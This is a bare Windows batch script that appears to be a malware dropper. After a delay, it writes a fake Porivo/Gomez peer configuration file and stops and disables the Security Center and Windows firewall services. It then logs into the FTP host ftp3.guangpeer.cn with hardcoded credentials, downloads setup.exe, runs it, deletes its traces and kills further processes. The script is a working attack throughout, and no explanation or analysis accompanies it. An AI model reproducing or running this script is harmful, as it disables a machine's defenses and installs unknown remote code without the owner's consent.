 @echo off
ping -n 180 127.1>nul
echo ^<?xml version="1.0" encoding="UTF-8"?^> >gomez.dat
echo ^<Message ClassName="com.porivo.kernel.KernelState"^> >>gomez.dat
echo   ^<PorivoPeerMetaData^> >>gomez.dat
echo     ^<UserInfo^> >>gomez.dat
echo       ^<login^>zd^</login^> >>gomez.dat
echo     ^</UserInfo^> >>gomez.dat
echo     ^<MachineInfo^> >>gomez.dat
echo       ^<machineName^>%computername%^</machineName^> >>gomez.dat
echo       ^<isp^>CHINANET Guangdong province network^</isp^> >>gomez.dat
echo       ^<network_alpha^>DSL^</network_alpha^> >>gomez.dat
echo       ^<os_alpha^>Windows XP^</os_alpha^> >>gomez.dat
echo       ^<avg_bandwidth^>40000^</avg_bandwidth^> >>gomez.dat
echo       ^<isp_country^>China^</isp_country^> >>gomez.dat
echo       ^<version^>3.1^</version^> >>gomez.dat
echo       ^<show_gui^>false^</show_gui^> >>gomez.dat
echo       ^<country_alpha^>China^</country_alpha^> >>gomez.dat
echo       ^<region_alpha^>Guangdong^</region_alpha^> >>gomez.dat
echo       ^<location_alpha^>unset^</location_alpha^> >>gomez.dat
echo       ^<isp_ip^>202.96.128.86^</isp_ip^> >>gomez.dat
echo       ^<ram^>959^</ram^> >>gomez.dat
echo       ^<usage_threshold^>0^</usage_threshold^> >>gomez.dat
echo       ^<sysid^>-1^</sysid^> >>gomez.dat
echo       ^<cpu_alpha^>Pentium^</cpu_alpha^> >>gomez.dat
echo     ^</MachineInfo^> >>gomez.dat
echo   ^</PorivoPeerMetaData^> >>gomez.dat
echo ^</Message^> >>gomez.dat
net1 stop wscsvc
sc config wscsvc start= Disabled
net1 stop SharedAccess
sc config SharedAccess start= Disabled
ping -n 5 127.1>nul
echo open ftp3.guangpeer.cn>1.txt
echo tsinternetuser>>1.txt
echo woaini>>1.txt
echo get setup.exe setup.exe>>1.txt
echo bye>>1.txt
ftp1 -s:1.txt
del 1.txt
setup.exe
net1 stop Print
taskkill /im srvany.exe /f
exit